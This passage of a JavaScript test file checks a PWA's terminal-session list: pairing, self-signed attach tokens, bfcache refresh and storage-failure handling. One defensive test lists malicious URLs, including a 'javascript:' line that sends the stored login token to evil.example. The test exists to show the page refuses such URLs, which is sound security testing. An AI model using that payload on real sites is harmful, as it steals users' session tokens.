// Exercises the terminal-list logic in server/public/app.js — refreshTerminal()
// and each card's open-button click handler — through the node:vm fake-DOM
// harness in dom-harness.mjs. app.js has no other test coverage today (see
// task-6 brief); this is scoped to the terminal list only, which is the
// surface this task actually changed. The rest of app.js (login, push
// subscribe) is unchanged and untouched by these tests.
import test from 'node:test';
import assert from 'node:assert/strict';
import { webcrypto } from 'node:crypto';
import { loadAppPage, makeFetch } from './dom-harness.mjs';
import { createTerminalSessions } from '../src/terminal-sessions.js';
// Task 9: hub-signed v1 tickets are gone — the phone signs its own v2 attach
// token (term/src/ticket.js), and this is the exact function the DAEMON
// verifies it with. Importing it here is what closes the loop: a test that
// only checked "some string appears after #t=" would miss any drift in the
// signed string or the signature encoding; one that re-verifies with the
// daemon's own verifier cannot.
import { verifyAttachToken } from '../../term/src/ticket.js';

// Fixtures are built through createTerminalSessions() — the same code that
// produces the hub's real GET /api/terminal response shape (its toPublic())
// — instead of hand-rolled object literals. This is the fix for a real gap:
// Task 2 changed the hub's response from `{session}` to `{sessions: [...]}`,
// which broke the live page, yet every test in this file stayed green
// because its mocks still hand-typed the old `{session}` shape and never
// noticed the drift. Building fixtures from the real producer means a future
// field rename/add/remove in terminal-sessions.js's toPublic() shows up here
// automatically — see terminal-api.test.js for the equivalent check against
// the real HTTP wire format (it starts an actual hub process).
function makeSession(sessionId, { alive = true, label = '', machine = 'may-dev' } = {}) {
  let clock = 0;
  const hub = createTerminalSessions({ now: () => clock });
  hub.register('fixture-user', {
    // A REAL Tailscale address. The old fixture said 100.1.2.3, which looks
    // like one but is not: the CGNAT block is 100.64.0.0/10, so the second
    // octet has to be 64..127. It went unnoticed while nothing checked the
    // url; now that both the hub and the page do, a fixture outside the block
    // would be testing the reject path everywhere by accident.
    sessionId, machine, url: 'http://100.86.1.2:8730/', secret: 'x'.repeat(32), label,
  });
  if (!alive) clock = 61_000; // past terminal-sessions.js's HEARTBEAT_DEAD_MS
  return hub.list('fixture-user')[0];
}

const SESSION_ALIVE = makeSession('s-1', { alive: true, label: 'cc-remote-control' });
const SESSION_ALIVE_2 = makeSession('s-2', { alive: true, label: 'workspace', machine: 'may-dev' });
const SESSION_DEAD = makeSession('s-1', { alive: false, label: 'cc-remote-control' });
const SESSION_KHONG_NHAN = makeSession('s-3', { alive: true, label: '', machine: 'may-dev' });

// No token is passed to loadAppPage() in these tests: app.js auto-runs
// `showMain()` at load time when a token is already in localStorage (the
// "already logged in" case), which would race these tests' own explicit
// calls and pull in the unrelated push/notifications flows. Leaving token
// empty keeps that branch dormant so each test drives refreshTerminal() and
// each card's click handler directly and deterministically — the thing this
// task actually changed.

// A card built by buildTerminalCard() is `<div class="card terminal-card">`
// with a title row as its first child, then either an open button or a
// "không phản hồi" note as its second child. Helper mirrors that shape so
// tests don't hard-code positions inline everywhere.
// Hàng tiêu đề giờ chứa tối đa hai span: chấm "chưa đọc" (chỉ khi có) rồi
// tên. Tên LUÔN là span cuối — hợp đồng này giữ cho helper không phải đoán
// chỉ số theo việc có chấm hay không.
//
// Cấu trúc thẻ: [hàng tên] [dòng phụ?] [nút | câu "máy không phản hồi"?].
// Tìm theo class chứ KHÔNG theo kiểu loại trừ ("phần tử không phải hàng tên và
// không phải button"): dòng phụ mới sẽ lọt vào đúng cái lưới loại trừ đó, và
// test sẽ xanh trong khi nó đang soi nhầm phần tử.
const titleOf = (card) => card.children[0].children.at(-1).textContent;
const dotOf = (card) => card.children[0].children.find((c) => c.classList.contains('unread-dot'));
const openButtonOf = (card) => card.children.find((c) => c.tagName === 'BUTTON');
const metaOf = (card) => card.children.find((c) => c.classList.contains('terminal-meta'));
const noteOf = (card) => card.children.find((c) => c.classList.contains('terminal-note'));

// Card gating (Task 9): buildTerminalCardAsync() only shows "Mở terminal" for
// a machine already remembered as paired — otherwise the card offers "Ghép
// máy này" instead (see the dedicated test below). Every test here that
// exercises the OPEN flow needs the machine pre-paired first, exactly the way
// a real phone would have done it once, earlier, through the pairing panel.
// ensureDeviceKey() must run before rememberMachine(): the device record
// rememberMachine() writes into doesn't exist until ensureDeviceKey() creates
// it — calling it first is a no-op, not an error, which would be an easy way
// for this setup to silently fail to pair anything.
async function pairMachine(context, machine) {
  await context.ensureDeviceKey();
  await context.rememberMachine(machine);
}

test('không có phiên nào → danh sách ẩn, dòng trống hiện ra', async () => {
  const fetchImpl = makeFetch(async (url) => {
    assert.equal(url, '/api/terminal');
    return { status: 200, body: { sessions: [] } };
  });
  const { context, byId } = loadAppPage({ fetchImpl });
  await context.refreshTerminal();
  assert.equal(byId['terminal-list'].classList.contains('hidden'), true);
  assert.equal(byId['terminal-empty'].classList.contains('hidden'), false);
});

test('một phiên alive, máy đã ghép → một thẻ, tiêu đề là nhãn, tên máy xuống dòng phụ, nút Mở terminal hiện', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { context, byId } = loadAppPage({ fetchImpl });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();
  assert.equal(byId['terminal-list'].classList.contains('hidden'), false);
  assert.equal(byId['terminal-empty'].classList.contains('hidden'), true);
  assert.equal(byId['terminal-list'].children.length, 1);
  const card = byId['terminal-list'].children[0];
  assert.equal(titleOf(card), 'cc-remote-control');
  assert.equal(metaOf(card).textContent, 'may-dev');
  assert.ok(openButtonOf(card), 'phải có nút mở');
  assert.equal(openButtonOf(card).textContent, 'Mở terminal');
});

test('nhiều phiên alive → mỗi phiên một thẻ riêng, đúng thứ tự hub trả về', async () => {
  const fetchImpl = makeFetch(async () => ({
    status: 200,
    body: { sessions: [SESSION_ALIVE, SESSION_ALIVE_2] },
  }));
  const { context, byId } = loadAppPage({ fetchImpl });
  await pairMachine(context, 'may-dev'); // cả hai phiên đều chạy trên máy này
  await context.refreshTerminal();
  assert.equal(byId['terminal-list'].children.length, 2);
  assert.equal(titleOf(byId['terminal-list'].children[0]), 'cc-remote-control');
  assert.equal(metaOf(byId['terminal-list'].children[0]).textContent, 'may-dev');
  assert.equal(titleOf(byId['terminal-list'].children[1]), 'workspace');
  assert.equal(metaOf(byId['terminal-list'].children[1]).textContent, 'may-dev');
});

test('alive:false → thẻ đó không có nút, nói rõ máy không phản hồi', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_DEAD] } }));
  const { context, byId } = loadAppPage({ fetchImpl });
  await context.refreshTerminal();
  const card = byId['terminal-list'].children[0];
  assert.equal(openButtonOf(card), undefined, 'không được đưa đường dẫn treo');
  const note = noteOf(card);
  assert.ok(note, 'phải có dòng giải thích thay cho nút');
  assert.match(note.textContent, /không phản hồi/);
});

test('GET /api/terminal lỗi mạng → báo lỗi, không suy đoán trạng thái', async () => {
  const fetchImpl = makeFetch(async () => { throw new Error('network down'); });
  const { context, byId } = loadAppPage({ fetchImpl });
  await context.refreshTerminal();
  assert.equal(byId['terminal-err'].classList.contains('hidden'), false);
  assert.match(byId['terminal-err'].textContent, /Không lấy được trạng thái/);
});

// --- Task 9: hub không còn ký vé — điện thoại tự ký, hub ra rìa hoàn toàn ---

test('bấm Mở terminal: KHÔNG gọi hub xin vé, tự ký rồi điều hướng sang <url>#t=<token>', async () => {
  let goiVe = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal/ticket') { goiVe += 1; return { status: 404, body: {} }; }
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE] } };
    throw new Error('unexpected url ' + url);
  });
  const { context, byId, location } = loadAppPage({ fetchImpl });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  assert.equal(goiVe, 0, 'hub không còn vai trò gì trong việc mở terminal');
  assert.ok(location.href.startsWith(SESSION_ALIVE.url + '#t=v2.'),
    `phải là token v2 tự ký; thấy: ${location.href}`);
});

test('token tự ký xác minh được bằng đúng bộ kiểm của daemon', async () => {
  // Vòng khép kín: ký ở trình duyệt, kiểm bằng chính hàm daemon dùng. Đây là
  // chỗ mọi lệch pha về định dạng chữ ký hay chuỗi được ký sẽ lộ ra.
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE] } };
    throw new Error('unexpected url ' + url);
  });
  const { context, byId, location } = loadAppPage({ fetchImpl });
  const { pubKey, deviceId } = await context.ensureDeviceKey();
  await context.rememberMachine(SESSION_ALIVE.machine);
  await context.refreshTerminal();
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  // URLSearchParams thay vì split('#t='): fragment chỉ mang `t=` và test ngay
  // dưới đây canh đúng điều đó, nhưng đọc nó như một bộ tham số thì bài kiểm
  // vòng khép kín này vẫn đúng dù fragment có đổi hình dạng lần nữa.
  const hash = location.href.slice(location.href.indexOf('#') + 1);
  const token = new URLSearchParams(hash).get('t');
  const r = verifyAttachToken(token, {
    findDevice: (id) => (id === deviceId ? { pubKey } : null),
    sessionId: SESSION_ALIVE.sessionId,
    // Host mà signAttachToken() vừa ký vào token (C3, spec §13) phải khớp
    // đúng host của chính session.url — đây là "daemon thật" trong test này.
    expectedHost: new URL(SESSION_ALIVE.url).host,
  });
  assert.equal(r.ok, true, `daemon sẽ từ chối token này vì "${r.reason}"`);
});

// Task 15 review, mục 5: không có gì canh tính chất "một nonce khác mỗi lần
// ký" ở TẦNG MINT — term/test/*.js chỉ canh việc DÙNG LẠI một nonce đã thấy
// bị daemon chặn (nonce-store.js), không canh việc signAttachToken() có sinh
// nonce khác nhau ngay từ đầu hay không. Nếu một refactor tương lai lỡ cache
// hoặc tái dùng `nonceBytes`, "token một lần" không còn ý nghĩa gì ở phía
// sinh ra nó, dù phía daemon vẫn đúng.
test('signAttachToken sinh nonce khác nhau giữa các lần gọi, cùng một phiên', async () => {
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE] } };
    throw new Error('unexpected url ' + url);
  });
  const { context } = loadAppPage({ fetchImpl });

  const decodeNonce = (token) => {
    const [, b64] = token.split('.');
    return JSON.parse(Buffer.from(b64, 'base64url').toString()).n;
  };

  const t1 = await context.signAttachToken(SESSION_ALIVE);
  const t2 = await context.signAttachToken(SESSION_ALIVE);

  assert.notEqual(decodeNonce(t1), decodeNonce(t2),
    'hai lần ký liên tiếp cho cùng một phiên phải ra hai nonce khác nhau — đó là toàn bộ nền tảng của "token một lần"');
});

test('bấm Mở terminal ở một thẻ không ảnh hưởng thẻ khác', async () => {
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE, SESSION_ALIVE_2] } };
    throw new Error('unexpected url ' + url);
  });
  const { context, byId } = loadAppPage({ fetchImpl });
  await pairMachine(context, 'may-dev');
  await context.refreshTerminal();
  const [first, second] = byId['terminal-list'].children;
  // Không cần một promise xin vé bị hoãn lại như trước (Task 9 bỏ bước xin
  // vé): ký chữ ký trên điện thoại đã sẵn là bất đồng bộ thật (IndexedDB +
  // WebCrypto), nên khoảng hở giữa "khoá nút" và "điều hướng xong" tự nhiên
  // đã có, không cần giả lập.
  const clickPromise = openButtonOf(first).onclick();
  assert.equal(openButtonOf(first).textContent, 'Đang mở…');
  assert.equal(openButtonOf(first).disabled, true);
  assert.equal(openButtonOf(second).textContent, 'Mở terminal', 'thẻ khác không bị khoá theo');
  assert.equal(openButtonOf(second).disabled, false);

  await clickPromise;
});

// --- bfcache/return-to-app coverage ----------------------------------------
//
// Tapping "Mở terminal" disables that card's button, sets it to "Đang mở…",
// then navigates away with `location.href`. Coming back — Back button, or
// the phone just switching apps and returning — often restores the page
// from the browser's back/forward cache: the DOM is reinstated exactly as
// the click handler left it and no script re-runs, so without a 'pageshow'
// (and 'visibilitychange') listener the button stays stuck disabled
// forever. See app.js's refreshOnReturn() and the coalescing
// refreshTerminal() wrapper around doRefreshTerminal(). Because
// renderTerminalList() rebuilds the whole list on every refresh, the stuck
// button's DOM node is discarded, not mutated — a fresh render can't
// inherit stale busy state.

test('bfcache restore (pageshow) đưa nút về "Mở terminal", bấm lại được', async () => {
  let terminalCalls = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') { terminalCalls++; return { status: 200, body: { sessions: [SESSION_ALIVE] } }; }
    throw new Error('unexpected url ' + url);
  });
  const { context, byId, window } = loadAppPage({ fetchImpl });
  await pairMachine(context, SESSION_ALIVE.machine);
  byId['main'].classList.remove('hidden'); // logged in, main screen showing
  await context.refreshTerminal();
  await openButtonOf(byId['terminal-list'].children[0]).onclick(); // leaves the button stuck: disabled, "Đang mở…"
  assert.equal(openButtonOf(byId['terminal-list'].children[0]).disabled, true);
  assert.equal(openButtonOf(byId['terminal-list'].children[0]).textContent, 'Đang mở…');

  // Simulate the browser restoring the page from bfcache on return, e.g.
  // `event.persisted === true`.
  await Promise.all(window.dispatch('pageshow', { persisted: true }));

  const freshBtn = openButtonOf(byId['terminal-list'].children[0]);
  assert.equal(freshBtn.textContent, 'Mở terminal', 'phải hết kẹt ở "Đang mở…"');
  assert.equal(freshBtn.disabled, false, 'phải bấm lại được');
  assert.equal(terminalCalls, 2, 'pageshow phải làm mới danh sách bằng một lần gọi GET /api/terminal mới');
});

test('phiên đã đóng trong lúc rời đi → pageshow làm danh sách phản ánh "không có phiên", không còn link treo', async () => {
  let terminalCalls = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') {
      terminalCalls++;
      // First load: alive. By the time the user comes back, the daemon
      // session is gone — the exact "stale card, link into nothing" case
      // from the brief.
      return { status: 200, body: { sessions: terminalCalls === 1 ? [SESSION_ALIVE] : [] } };
    }
    throw new Error('unexpected url ' + url);
  });
  const { context, byId, window } = loadAppPage({ fetchImpl });
  await pairMachine(context, SESSION_ALIVE.machine);
  byId['main'].classList.remove('hidden');
  await context.refreshTerminal();
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  await Promise.all(window.dispatch('pageshow', { persisted: true }));

  assert.equal(byId['terminal-list'].classList.contains('hidden'), true, 'danh sách phải ẩn khi hết phiên trong lúc rời đi');
  assert.equal(byId['terminal-list'].children.length, 0);
  assert.equal(byId['terminal-empty'].classList.contains('hidden'), false);
});

test('pageshow và visibilitychange dồn dập → đúng một lần gọi hub, dù đang có nhiều thẻ', async () => {
  let terminalCalls = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') { terminalCalls++; return { status: 200, body: { sessions: [SESSION_ALIVE, SESSION_ALIVE_2] } }; }
    throw new Error('unexpected url ' + url);
  });
  const { byId, window, document } = loadAppPage({ fetchImpl });
  byId['main'].classList.remove('hidden');

  // A bfcache restore can fire 'pageshow' and 'visibilitychange' back to
  // back; a background/foreground app switch can also fire
  // 'visibilitychange' more than once in a burst. All of it must collapse
  // into one hub request — not one per event, and not one per card.
  const results = [
    ...window.dispatch('pageshow', { persisted: true }),
    ...document.dispatch('visibilitychange'),
    ...document.dispatch('visibilitychange'),
  ];
  await Promise.all(results);

  assert.equal(terminalCalls, 1, 'nhiều sự kiện dồn dập chỉ được gọi hub đúng một lần');
});

test('chưa đăng nhập (màn hình main còn ẩn) → pageshow không gọi hub', async () => {
  let terminalCalls = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') { terminalCalls++; return { status: 200, body: { sessions: [] } }; }
    throw new Error('unexpected url ' + url);
  });
  const { byId, window } = loadAppPage({ fetchImpl });
  byId['main'].classList.add('hidden'); // still on login screen — never called showMain()

  await Promise.all(window.dispatch('pageshow', { persisted: true }));

  assert.equal(terminalCalls, 0, 'không được gọi /api/terminal trước khi đăng nhập');
});

test('ký thất bại (IndexedDB/WebCrypto lỗi) → báo lỗi, làm mới danh sách, KHÔNG điều hướng', async () => {
  // Task 9 bỏ bước xin vé qua hub, nên "xin vé thất bại" không còn nghĩa gì
  // nữa — thứ có thể thất bại giờ là chính việc KÝ trên điện thoại. Giả lập
  // bằng một `crypto` một phần: mọi phần ensureDeviceKey()/pairedMachines()
  // cần vẫn hoạt động thật (nên thẻ vẫn hiện "Mở terminal" bình thường), chỉ
  // subtle.sign() — bước signAttachToken() thật sự cần — bị chặn.
  let terminalCalls = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') {
      terminalCalls++;
      // First load: session alive. After the failed sign, the list must
      // refresh and reflect that the session is now gone — exactly the
      // "disappeared between load and tap" case from the brief.
      return { status: 200, body: { sessions: terminalCalls === 1 ? [SESSION_ALIVE] : [] } };
    }
    throw new Error('unexpected url ' + url);
  });
  const brokenCrypto = {
    getRandomValues: (arr) => webcrypto.getRandomValues(arr),
    subtle: {
      generateKey: (...a) => webcrypto.subtle.generateKey(...a),
      exportKey: (...a) => webcrypto.subtle.exportKey(...a),
      digest: (...a) => webcrypto.subtle.digest(...a),
      verify: (...a) => webcrypto.subtle.verify(...a),
      sign: () => { throw new Error('ký giả lập thất bại'); },
    },
  };
  const { context, byId, location } = loadAppPage({ fetchImpl, cryptoImpl: brokenCrypto });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  assert.equal(location.href, '', 'không được điều hướng vào trang chết khi ký thất bại');
  assert.equal(byId['terminal-err'].classList.contains('hidden'), false);
  assert.match(byId['terminal-err'].textContent, /Không ký được/);
  assert.equal(terminalCalls, 2, 'phải gọi lại GET /api/terminal để làm mới danh sách');
  assert.equal(byId['terminal-list'].classList.contains('hidden'), true, 'danh sách phải phản ánh phiên đã mất');
  assert.equal(byId['terminal-empty'].classList.contains('hidden'), false);
});

// --- Task 9, review trước: pairing panel không có lối vào — nút này chính
// là lối vào đó ------------------------------------------------------------
//
// Sau Task 7, ensureDeviceKey/sasFor/startPairing/pairedMachines đã tồn tại
// nhưng không có gì trong UI gọi startPairing() cả — bảng ghép cặp không ai
// bấm tới được. buildTerminalCardAsync() đóng lỗ đó: máy chưa ghép được mời
// ghép ngay trên chính thẻ của nó, thay vì đưa một nút "Mở terminal" chắc
// chắn dẫn tới một token bị daemon từ chối.

test('máy chưa ghép → thẻ hiện "Ghép máy này", bấm vào mở bảng ghép cặp qua startPairing()', async () => {
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE] } };
    if (url === '/api/pair/start') return { status: 200, body: { pairId: 'p-9' } };
    // Trả nonceMachine ngay ở lần hỏi đầu tiên để vòng lặp chờ trong
    // startPairing() thoát ngay, không phải chờ 1 giây thật nào — bài kiểm
    // này không nói về việc polling, chỉ nói về việc CÓ gọi tới nó không.
    if (url === '/api/pair/p-9') return { status: 200, body: { nonceMachine: 'nonce-may-that' } };
    if (url === '/api/pair/reveal') return { status: 200, body: { ok: true } };
    throw new Error('unexpected url ' + url);
  });
  const { context, byId } = loadAppPage({ fetchImpl });
  // startPairing() tự khởi một vòng chờ verdict CHẠY NỀN sau khi hiện SAS
  // (waitForPairVerdict — Task 13 review). Mock ở trên không có nhánh
  // 'done'/'aborted' cho GET /api/pair/p-9 nên vòng đó sẽ ngủ thật 1 giây mỗi
  // lần nếu không ghi đè setTimeout — bài kiểm này không nói về vòng chờ đó.
  context.setTimeout = (fn) => fn();
  await context.refreshTerminal(); // không ensureDeviceKey/rememberMachine — máy vẫn chưa ghép
  const card = byId['terminal-list'].children[0];
  const btn = openButtonOf(card);
  assert.ok(btn, 'phải vẫn có một nút, chỉ đổi nhãn và hành vi');
  assert.equal(btn.textContent, 'Ghép máy này', 'máy chưa ghép phải mời ghép, không đưa nút mở thẳng');

  await btn.onclick();

  assert.equal(byId['pair-panel'].classList.contains('hidden'), false,
    'bấm "Ghép máy này" phải mở bảng ghép cặp — đây là lối vào duy nhất tới startPairing()');
  assert.match(byId['pair-sas'].textContent, /^\d{6}$/, 'startPairing() phải chạy tới bước hiện số so sánh');
});

// --- Review sau Task 13: bỏ `machine` khỏi trạng thái ghép cặp đã vô tình cắt
// đứt NGƯỜI ĐỌC duy nhất của pairedMachines() ------------------------------
//
// Task 13 thay [Khớp]/[Không khớp] bằng "gõ số vào máy dev", và trong lúc đó
// bỏ luôn `rememberMachine()` khỏi luồng ghép cặp — không còn nơi nào GHI vào
// pairedMachines() nữa. buildTerminalCardAsync() (dòng ~128) chỉ hiện "Mở
// terminal" khi pairedMachines() chứa tên máy; không ai ghi vào đó thì thẻ
// mãi mãi hiện "Ghép máy này", openTerminal() không ai bấm tới được — hỏng
// hẳn tính năng chính của app, không phải chuyện khó chịu về UX. Bài kiểm
// này là đúng cái phép thử sẽ bắt được lỗi đó: đi hết một lượt ghép cặp qua
// đúng con đường máy dev thật sự dùng — start → nonceMachine → reveal → máy
// dev báo `done` qua /api/pair/finish (spec §12.3) — rồi khẳng định thẻ đó
// đổi hẳn sang "Mở terminal", không chỉ khẳng định rememberMachine() tồn tại.
test('ghép cặp trọn vẹn (máy dev báo done) → thẻ đổi từ "Ghép máy này" sang "Mở terminal"', async () => {
  let pollCount = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE] } };
    if (url === '/api/pair/start') return { status: 200, body: { pairId: 'p-done' } };
    if (url === '/api/pair/p-done') {
      pollCount += 1;
      // Lần hỏi ĐẦU (vòng chờ nonceMachine): máy dev đã gửi nonce.
      // Lần hỏi THỨ HAI trở đi (vòng chờ verdict): máy dev đã gõ
      // `/remote pair xac-nhan <số>` đúng, và tự nó đã gọi
      // POST /api/pair/finish {ok:true} — hub chỉ RƠ-LAY lại 'done' đó.
      if (pollCount === 1) return { status: 200, body: { state: 'challenged', nonceMachine: 'nonce-that' } };
      return { status: 200, body: { state: 'done' } };
    }
    if (url === '/api/pair/reveal') return { status: 200, body: { ok: true } };
    throw new Error('unexpected url ' + url);
  });
  const { context, byId } = loadAppPage({ fetchImpl });
  context.setTimeout = (fn) => fn();
  await context.refreshTerminal();

  const cardBefore = byId['terminal-list'].children[0];
  assert.equal(openButtonOf(cardBefore).textContent, 'Ghép máy này');

  await openButtonOf(cardBefore).onclick();

  assert.equal(byId['pair-panel'].classList.contains('hidden'), true,
    'máy dev báo done phải đóng bảng ghép cặp lại, không đứng chờ tiếp');
  assert.deepEqual([...(await context.pairedMachines())], [SESSION_ALIVE.machine],
    'verdict done phải ghi máy vào pairedMachines() — đây là cái Task 13 đã vô tình bỏ mất');

  // Thẻ được VẼ LẠI (không phải thẻ cũ mutate) — lấy lại thẻ mới nhất từ
  // danh sách, đúng cách renderTerminalList() luôn làm.
  const cardAfter = byId['terminal-list'].children[0];
  assert.equal(openButtonOf(cardAfter).textContent, 'Mở terminal',
    'sau khi máy dev xác nhận xong, thẻ phải cho mở terminal thật — không mời ghép lại vô tận');
});

// --- Review Task 9: IndexedDB lỗi không được biến thành đăng xuất ----------
//
// buildTerminalCardAsync() await pairedMachines() cho MỖI thẻ khi vẽ lại
// danh sách. renderTerminalList() được await NGOÀI try/catch của
// doRefreshTerminal() (try/catch ở đó chỉ bọc fetch('/api/terminal')), nên
// một lỗi ở đây từng leo thẳng lên refreshTerminal() rồi showMain(), và
// showMain().catch(() => logout()) ở đáy file biến MỘT TRỤC TRẶC LƯU TRỮ TẠM
// THỜI (chế độ riêng tư, quota, store bị khoá) thành ĐĂNG XUẤT NGƯỜI DÙNG —
// dù token đăng nhập chẳng có vấn đề gì. Bài kiểm này lái qua đúng đường đó
// (showMain(), không phải refreshTerminal() trực tiếp) để chứng minh chuỗi
// lỗi thật sự không còn leo tới logout() nữa.
test('IndexedDB lỗi khi vẽ danh sách terminal → KHÔNG đăng xuất người dùng, thẻ hiện "Ghép máy này"', async () => {
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/me') return { status: 200, body: { user: 'huy', pushDevices: 0 } };
    if (url === '/api/terminal') return { status: 200, body: { sessions: [SESSION_ALIVE] } };
    throw new Error('unexpected url ' + url);
  });
  // `indexedDB.open()` ném ĐỒNG BỘ — đúng cách một store bị khoá/quota lỗi
  // biểu hiện, không phải cách gõ tay dễ nhất. new Promise((res, rej) => {…})
  // trong idbOpen() tự bọc throw đồng bộ thành reject, nên đây vẫn đi đúng
  // đường bất đồng bộ mà pairedMachines() phải chịu được.
  const brokenIndexedDB = {
    open() { throw new Error('IndexedDB bị chặn (giả lập chế độ riêng tư/quota)'); },
  };
  const { context, byId } = loadAppPage({ fetchImpl, indexedDBImpl: brokenIndexedDB });

  await assert.doesNotReject(() => context.showMain(),
    'lỗi IndexedDB khi vẽ thẻ terminal không được văng lên tới showMain() và bị coi là đăng nhập hỏng');

  assert.equal(byId['main'].classList.contains('hidden'), false, 'không được đăng xuất — main phải vẫn hiện');
  assert.equal(byId['login'].classList.contains('hidden'), true, 'không được bật lại màn hình đăng nhập');
  const card = byId['terminal-list'].children[0];
  assert.ok(card, 'danh sách vẫn phải vẽ được dù IndexedDB lỗi, không phải một danh sách trống giả');
  assert.equal(openButtonOf(card).textContent, 'Ghép máy này',
    'không đọc được trạng thái ghép cặp thì phải coi là CHƯA ghép — trạng thái trung thực, khôi phục được — không phải một lỗi treo');
});

// --- Kiểm toán 2026-07-29, lỗi 2: trang KHÔNG đi tới url nó không hiểu -----
//
// Hub đã lọc `url` khi đăng ký (src/session-url.js), nên tới được đây là
// chuyện đáng lẽ không xảy ra. Lớp này vẫn cần: `location.href = <chuỗi từ
// server>` là một câu lệnh "đi bất cứ đâu server bảo", và trang đang giữ
// token trong localStorage. Một hub bị chiếm, hay một lỗi lọt lưới ở phía
// hub, không được biến thành mất token ngay trong origin của PWA.
//
// `javascript:` là ca đắt nhất: nó không điều hướng đi đâu cả, nó CHẠY, ngay
// trong origin này, đọc thẳng được localStorage.ccrc_token.
//
// Task 9: kiểm này phải PAIR máy trước — nếu không, nút của thẻ là "Ghép máy
// này" (onclick = startPairing), không phải openTerminal(), và bài kiểm sẽ
// không còn thử đúng đường mã (isTailnetTerminalUrl) mà nó nhắm tới.

function makeSessionWithUrl(url) {
  return { ...SESSION_ALIVE, url };
}

const URL_XAU = [
  ['javascript:', 'javascript:fetch("https://evil.example/"+localStorage.ccrc_token)'],
  ['domain lạ', 'https://evil.example/term/'],
  ['data:', 'data:text/html,<script>1</script>'],
  ['địa chỉ ngoài tailnet', 'http://10.0.0.5:8730/'],
];

for (const [ten, url] of URL_XAU) {
  test(`url ${ten} → KHÔNG điều hướng, hiện lỗi thay vì đi tới`, async () => {
    const session = makeSessionWithUrl(url);
    const fetchImpl = makeFetch(async (u) => {
      if (u === '/api/terminal') return { status: 200, body: { sessions: [session] } };
      throw new Error('unexpected url ' + u);
    });
    const { context, byId, location } = loadAppPage({ fetchImpl });
    await pairMachine(context, session.machine);
    await context.refreshTerminal();
    await openButtonOf(byId['terminal-list'].children[0]).onclick();

    assert.equal(location.href, '', `đã điều hướng tới ${url} — đây chính là lỗi`);
    assert.equal(byId['terminal-err'].classList.contains('hidden'), false, 'phải nói cho người dùng biết, không im lặng');
  });
}

test('url tailnet hợp lệ vẫn điều hướng bình thường', async () => {
  const session = makeSessionWithUrl('http://100.101.102.103:62539/');
  const fetchImpl = makeFetch(async (u) => {
    if (u === '/api/terminal') return { status: 200, body: { sessions: [session] } };
    throw new Error('unexpected url ' + u);
  });
  const { context, byId, location } = loadAppPage({ fetchImpl });
  await pairMachine(context, session.machine);
  await context.refreshTerminal();
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  assert.ok(location.href.startsWith('http://100.101.102.103:62539/#t=v2.'),
    `lớp chặn không được chặn nhầm đường đi thật — đó là toàn bộ tính năng; thấy: ${location.href}`);
});

// --- Chấm "chưa đọc" trên thẻ ----------------------------------------------
//
// Badge được tính từ MỘT nguồn: `lastNotifiedAt` mà /api/terminal trả về cho
// mỗi phiên. Trước đây nó là giao của /api/terminal với /api/notifications —
// tức là để vẽ được cái chấm này, hub phải nhớ hộ 50 thông báo gần nhất của
// mỗi người, tiêu đề và nội dung thật. Nó không cần: câu hỏi duy nhất cái chấm
// đặt ra là "phiên này có việc gì sau lần tôi xem cuối không", và một con số
// cho mỗi phiên trả lời được trọn vẹn.
//
// `box.notes` được giữ nguyên trong các test bên dưới vì nó diễn tả đúng thứ
// đang được mô phỏng — "những thông báo đã tới" — nhưng helper dịch nó thành
// mốc trên chính phiên, đúng hình dạng hub thật trả về.
const NOTE_BASE = {
  type: 'idle_prompt',
  title: '🔔 may-dev · cc-remote-control',
  body: 'Claude đang chờ bạn nhập',
  tag: 'ccrc-idle_prompt',
};

// `notes`/`sessions` là hộp có thể sửa giữa chừng, để một test dựng được cảnh
// "trong lúc mình đi vắng thì có thông báo mới về".
function makeFetchBoth(box) {
  return makeFetch(async (url) => {
    if (url === '/api/terminal') {
      // Đúng thứ hub thật làm: mỗi phiên mang mốc của thông báo GẦN NHẤT thuộc
      // về nó, 0 khi chưa có cái nào. `Math.max(0, ...[])` là 0, nên phiên
      // không có thông báo nào ra đúng hình dạng ấy mà không cần nhánh riêng.
      const sessions = box.sessions.map((s) => ({
        ...s,
        lastNotifiedAt: Math.max(0, ...box.notes
          .filter((n) => n && n.sessionId === s.sessionId)
          .map((n) => n.at)),
      }));
      return { status: 200, body: { sessions } };
    }
    throw new Error('unexpected url ' + url);
  });
}

async function refreshBoth(context) {
  await context.refreshTerminal();
}

test('thông báo mới hơn mốc đã đọc → thẻ của đúng phiên đó hiện chấm', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 1000 }] };
  const { context, byId } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  const card = byId['terminal-list'].children[0];
